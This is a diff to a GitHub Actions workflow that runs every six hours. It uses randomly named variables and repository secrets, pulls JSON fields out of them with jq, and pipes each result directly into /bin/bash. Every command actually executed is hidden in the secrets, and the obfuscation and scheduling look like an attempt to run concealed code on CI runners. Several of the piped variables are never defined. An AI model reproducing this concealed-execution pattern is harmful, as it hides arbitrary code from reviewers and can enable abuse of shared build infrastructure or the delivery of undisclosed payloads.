@@ -1,9 +1,9 @@
 name: yuanjiaming9876
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 0/6 * * *'
-
+    - cron: '41 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,23 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: yuanjiaming9876
         env:
-          q18: ${{ secrets.q18 }}
+          sawzv84: ${{ secrets.sawzv84 }}
         run: |
-          echo $q18 | jq -r .nzau01 | /bin/bash
-          echo $uebyo73354 | jq -r .ta72590 | /bin/bash
-          echo $kw5 | jq -r .fodfn24 | /bin/bash
-          echo $uwro37870 | jq -r .c37323 | /bin/bash
-          echo $xzmee229 | jq -r .qdns4 | /bin/bash
-          echo $g6359 | jq -r .fdgz3 | /bin/bash
-          echo $bws2 | jq -r .pi92 | /bin/bash
-          echo $p7 | jq -r .wayjn3357 | /bin/bash
-          echo $ngfa56143 | jq -r .phg4544 | /bin/bash
-          echo $nf28650 | jq -r .wun4 | /bin/bash
-          echo $q53 | jq -r .t8941 | /bin/bash
-          echo $ug58 | jq -r .sgtth429 | /bin/bash
-          echo $rofh0360 | jq -r .l724 | /bin/bash
-          echo $oc26 | jq -r .ewm56208 | /bin/bash
-          echo $w0 | jq -r .onf84 | /bin/bash
-          echo $hovy7183 | jq -r .a1979 | /bin/bash
-          echo $lrgt16 | jq -r .b2 | /bin/bash
+          echo $sawzv84 | jq -r .jwnxq452 | /bin/bash
+          echo $hh261 | jq -r .gc52 | /bin/bash
+          echo $s57 | jq -r .tqh234 | /bin/bash
+          echo $arzur23216 | jq -r .ronbj90 | /bin/bash
+          echo $ofyr0853 | jq -r .olplh4 | /bin/bash
+          echo $i8 | jq -r .l393 | /bin/bash
+          echo $adet14127 | jq -r .iy47416 | /bin/bash
+          echo $jo098 | jq -r .lv5240 | /bin/bash
 
